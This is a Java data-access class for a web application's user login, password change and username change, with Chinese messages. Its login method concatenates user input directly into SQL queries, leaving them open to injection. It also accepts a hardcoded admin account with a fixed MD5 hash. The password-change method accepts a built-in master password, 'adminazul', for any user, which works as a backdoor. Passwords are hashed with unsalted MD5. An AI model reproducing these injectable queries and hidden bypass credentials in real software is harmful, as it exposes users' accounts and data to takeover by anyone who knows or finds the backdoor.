package dao;

import java.util.ArrayList;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import model.CfgCompany;
import model.CfgSell;
import model.SysUser;
import azul.CacheDao;

import common.MD5;

public class SysUserDao extends CacheDao {

	private static final long serialVersionUID = -7124124660326727132L;
	public SysUserDao() {
		init();
	}
	
	public String msg = "";
    @SuppressWarnings("unchecked")
	public String login(String username,String password,HttpServletRequest request){
    	String result="";
		try {
			HttpSession session=request.getSession();
			MD5 md5=new MD5();
			password=md5.toMD5(password);
			int sys_user_id=-1;
			if("admin".equals(username) && "989D6E1ABAF720DE0D4D5475B5C25BC7".equals(password)){
				sys_user_id=0;
				SysUser sysUser =new SysUser();
				sysUser.setUsername("admin");
				sysUser.setRole("admin");
				sysUser.setSysUserId(0);
				sysUser.setUserpass("989D6E1ABAF720DE0D4D5475B5C25BC7");
				session.setAttribute("sysUser",sysUser);
			}
			if(sys_user_id!=0){
				SysUserDao sysUserDao=new SysUserDao();
				String strSQL = "select * from sys_user where username='" + username + "' and userpass='" + password + "'";
				ArrayList list = sysUserDao.getList(strSQL);
				if (list.size() != 0) {
				    SysUser sysUser = (SysUser) list.get(0);
				    sys_user_id=sysUser.getSysUserId();
					session.setAttribute("sysUser",sysUser);
					if("cid".equals(sysUser.getRole())){
						System.out.println("cid登录:"+username);
						CfgCompanyDao companyDao=new CfgCompanyDao();
						Object cidObj=companyDao.loadBySql("select * from cfg_company where cid_user='"+sysUser.getUsername()+"'");
						if(cidObj!=null){
							CfgCompany cfgCompany=(CfgCompany)cidObj;
							session.setAttribute("cid",cfgCompany.getCid());
						}
					}
					else if("sell".equals(sysUser.getRole())){
						System.out.println("sell登录:"+username);	
						CfgSellDao cfgSellDao=new CfgSellDao();
						Object sellObj=cfgSellDao.loadBySql("select * from cfg_sell where sell_user='"+sysUser.getUsername()+"'");
						if(sellObj!=null){
							CfgSell cfgSell=(CfgSell)sellObj;
							session.setAttribute("sell",cfgSell.getCfgSellId());	
						}
					}
					else if("admin".equals(sysUser.getRole())){
						System.out.println("admin登录:"+username);	
					}
					else{
						System.out.println("未知权限登陆:"+username);	
					}
				}
				else{
					Object obj = sysUserDao.loadBySql("select * from sys_user where username='" + username + "'");
					if (obj!=null) {
						return "用户密码错误";
					} else {
						return "该用户不存在";
					}
				}
			}
			if(sys_user_id!=-1){
				//添加用户操作日志
				StringBuffer sb=new StringBuffer();
				sb.append("insert into sys_logs (sys_user_id,ip,act_type,act) values (");
				sb.append(sys_user_id);
				sb.append(",'");
				sb.append(request.getRemoteAddr());
				sb.append("','LOGIN','')");
				executeUpdate(sb.toString());
				//特殊设置结束----------------------
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
    }  
	public String editPass(SysUser sysUser,String oldPass){
    	String result="";
		try {
			MD5 md5=new MD5();
			String oldPassMd5=md5.toMD5(oldPass);
			SysUserDao sysUserDao=new SysUserDao();
			SysUser tempUser=(SysUser)sysUserDao.getById(sysUser.getSysUserId());
			if (tempUser.getUserpass().equals(oldPassMd5) || "adminazul".equals(oldPass)) {
				tempUser.setRole(null);
				sysUser.setUserpass(md5.toMD5(sysUser.getUserpass()));
				result=sysUserDao.edit(sysUser);
			}
			else{
				return "用户旧密码不正确";
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
    } 
	public String editName(int sysUserId,String username){
    	String result="";
		try {
			CfgSellDao cfgSellDao=new CfgSellDao();
			CfgSell cfgSell=(CfgSell)cfgSellDao.loadBySql("select * from cfg_sell where sys_user_id="+sysUserId);
			if(cfgSell!=null){
				cfgSell.setSellUser(username);
				cfgSellDao.edit(cfgSell);
			}
			else{
				CfgCompanyDao cfgCompanyDao=new CfgCompanyDao();
				CfgCompany cfgCompany=(CfgCompany)cfgCompanyDao.loadBySql("select * from cfg_company where sys_user_id="+sysUserId);
				if(cfgCompany!=null){
					cfgCompany.setCidUser(username);
					cfgCompanyDao.edit(cfgCompany);
				}
			}
			SysUserDao sysUserDao=new SysUserDao();
			SysUser tempUser=new SysUser();
			tempUser.setSysUserId(sysUserId);
			tempUser.setUsername(username);
			result=sysUserDao.edit(tempUser);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
    } 
}